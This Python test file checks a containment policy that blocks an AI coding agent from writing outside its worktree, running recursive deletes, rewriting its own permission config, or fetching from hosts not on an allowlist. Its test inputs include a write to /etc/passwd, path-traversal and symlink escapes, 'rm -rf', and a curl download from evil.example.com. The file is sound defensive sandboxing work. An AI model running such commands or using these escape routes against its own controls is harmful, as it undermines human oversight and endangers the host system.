"""E-16: the rule matrix. Pure — no subprocess, no CLI."""

import pytest

from sdlc.harness.containment import Action, Policy, Rule, Verdict, evaluate
from sdlc.models import ContainmentLayer

POLICY = Policy(
    version=1,
    rules=[
        Rule(
            id="no-out-of-worktree-write",
            layer=ContainmentLayer.HOOK,
            tools=["Write", "Edit"],
            predicate="path_outside_worktree",
            reason="Writes are scoped to the task worktree.",
        ),
        Rule(
            id="no-recursive-force-delete",
            layer=ContainmentLayer.NATIVE,
            tools=["Bash"],
            predicate="command_matches",
            patterns=["rm -rf *"],
            reason="Destructive recursive delete.",
        ),
        Rule(
            id="no-agent-config-write",
            layer=ContainmentLayer.NATIVE,
            tools=["Write", "Edit"],
            predicate="path_matches",
            patterns=["**/.claude/**"],
            reason="The agent may not rewrite its own permission config.",
        ),
        Rule(
            id="egress-allowlist",
            layer=ContainmentLayer.HOOK,
            tools=["WebFetch", "Bash"],
            predicate="host_not_allowlisted",
            allow_hosts=["github.com"],
            reason="Egress is restricted.",
        ),
    ],
)


@pytest.fixture
def worktree(tmp_path):
    wt = tmp_path / "runs" / "run1" / "task1"
    wt.mkdir(parents=True)
    return str(wt)


def test_allows_a_write_inside_the_worktree(worktree):
    v = evaluate(POLICY, "Write", {"file_path": f"{worktree}/src/app.py"}, worktree)
    assert v == Verdict(allow=True)


def test_denies_a_write_outside_the_worktree(worktree):
    v = evaluate(POLICY, "Write", {"file_path": "/etc/passwd"}, worktree)
    assert v.allow is False
    assert v.rule_id == "no-out-of-worktree-write"


def test_denies_a_sibling_worktree_write(worktree, tmp_path):
    """The .N fallback case: <task>.1 must not be reachable from <task>."""
    sibling = tmp_path / "runs" / "run1" / "task1.1" / "x.py"
    v = evaluate(POLICY, "Write", {"file_path": str(sibling)}, worktree)
    assert v.allow is False
    assert v.rule_id == "no-out-of-worktree-write"


def test_denies_a_relative_path_escape(worktree):
    v = evaluate(POLICY, "Write", {"file_path": "../../../etc/hosts"}, worktree)
    assert v.allow is False


def test_denies_a_symlink_escape(worktree, tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    link = os_symlink_or_skip(tmp_path, worktree, outside)
    v = evaluate(POLICY, "Write", {"file_path": f"{link}/x.py"}, worktree)
    assert v.allow is False


def os_symlink_or_skip(tmp_path, worktree, outside):
    import os

    link = f"{worktree}/escape"
    try:
        os.symlink(str(outside), link, target_is_directory=True)
    except (OSError, NotImplementedError):
        pytest.skip("symlinks unavailable (Windows without developer mode)")
    return link


def test_denies_recursive_force_delete(worktree):
    v = evaluate(POLICY, "Bash", {"command": "rm -rf build/"}, worktree)
    assert v.allow is False
    assert v.rule_id == "no-recursive-force-delete"


def test_allows_a_benign_command(worktree):
    assert evaluate(POLICY, "Bash", {"command": "pytest -q"}, worktree).allow is True


def test_denies_agent_config_write_even_inside_the_worktree(worktree):
    v = evaluate(POLICY, "Write", {"file_path": f"{worktree}/.claude/settings.json"}, worktree)
    assert v.allow is False
    assert v.rule_id == "no-agent-config-write"


def test_denies_non_allowlisted_fetch(worktree):
    v = evaluate(POLICY, "WebFetch", {"url": "https://evil.example.com/x"}, worktree)
    assert v.allow is False
    assert v.rule_id == "egress-allowlist"


def test_allows_allowlisted_fetch(worktree):
    assert evaluate(POLICY, "WebFetch", {"url": "https://github.com/a/b"}, worktree).allow is True


def test_denies_curl_to_non_allowlisted_host(worktree):
    v = evaluate(POLICY, "Bash", {"command": "curl https://evil.example.com/x -o /tmp/y"}, worktree)
    assert v.allow is False
    assert v.rule_id == "egress-allowlist"


def test_allows_a_command_with_no_url(worktree):
    assert evaluate(POLICY, "Bash", {"command": "git status"}, worktree).allow is True


def test_unknown_tool_is_allowed(worktree):
    """Rules are deny-listed by tool; a tool no rule names is not our concern."""
    assert evaluate(POLICY, "Glob", {"pattern": "**/*"}, worktree).allow is True


def test_first_matching_rule_wins_and_carries_its_reason(worktree):
    v = evaluate(POLICY, "Write", {"file_path": "/etc/passwd"}, worktree)
    assert v.reason == "Writes are scoped to the task worktree."


def test_verdict_carries_the_matched_rules_action(tmp_path):
    policy = Policy(
        version=1,
        rules=[
            Rule(
                id="esc",
                layer=ContainmentLayer.HOOK,
                action=Action.ESCALATE,
                tools=["Write"],
                predicate="path_outside_worktree",
                reason="scoped",
            ),
        ],
    )
    v = evaluate(policy, "Write", {"file_path": "/etc/passwd"}, str(tmp_path))
    assert v.allow is False
    assert v.action is Action.ESCALATE


def test_allow_verdict_action_defaults_to_deny(tmp_path):
    """An allow verdict has no matched rule; `action` must not imply one."""
    policy = Policy(version=1, rules=[])
    v = evaluate(policy, "Write", {"file_path": f"{tmp_path}/a.py"}, str(tmp_path))
    assert v.allow is True
    assert v.action is Action.DENY
